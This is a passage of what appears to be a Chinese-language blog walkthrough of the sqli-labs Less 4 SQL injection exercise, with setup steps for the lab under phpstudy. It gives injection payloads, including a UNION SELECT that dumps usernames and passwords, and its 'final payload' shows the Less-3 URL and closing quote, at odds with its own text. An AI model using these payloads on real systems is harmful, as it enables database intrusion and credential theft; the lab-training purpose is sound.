-<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less 4"></a>Less 4</h1><p>这题需要闭合双引号。</p>
-<h2 id="payload1-2"><a href="#payload1-2" class="headerlink" title="payload1"></a>payload1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-4/?id=0&quot;</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less4payload1.jpg" alt=""><br>需要闭合 双引号</p>
-<h2 id="payload2-2"><a href="#payload2-2" class="headerlink" title="payload2"></a>payload2</h2><h3 id="类似-1"><a href="#类似-1" class="headerlink" title="类似"></a>类似</h3><p>将Less1中的几段payload的前面的 0’ 改为 0”)  即可</p>
-<h3 id="最终payload-1"><a href="#最终payload-1" class="headerlink" title="最终payload"></a>最终payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-3/?id=</div><div class="line">0&apos;)  UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+</div></pre></td></tr></table></figure>
-<h1 id="sqlilab环境搭建"><a href="#sqlilab环境搭建" class="headerlink" title="sqlilab环境搭建"></a>sqlilab环境搭建</h1><h2 id="下载sqlilab"><a href="#下载sqlilab" class="headerlink" title="下载sqlilab"></a>下载sqlilab</h2><p>传送门：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>可以选择下载zip后解压或者自行git clone到本地，</p>
-<h2 id="推荐phpstudy"><a href="#推荐phpstudy" class="headerlink" title="推荐phpstudy"></a>推荐phpstudy</h2><p>传送门：<a href="http://www.phpstudy.net/a.php/211.html" target="_blank" rel="external">http://www.phpstudy.net/a.php/211.html</a><br>不懂使用的建议查一查。<br>这里假设phpstudyd 主页为　<a href="http://localhost:20000/" target="_blank" rel="external">http://localhost:20000/</a></p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>将sqlilab解压出来的文件夹（默认名为 sqli-labs-master）拷贝到phpstudy的WWW目录下，打开phpstudy，访问sqlilab页面(  <a href="http://localhost:20000/sqli-labs-master" target="_blank" rel="external">http://localhost:20000/sqli-labs-master</a> )。<br>点选Setup/reset Database for labs完成数据库配置。之后即可开始实验。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;br&gt;
     
     </summary>
     
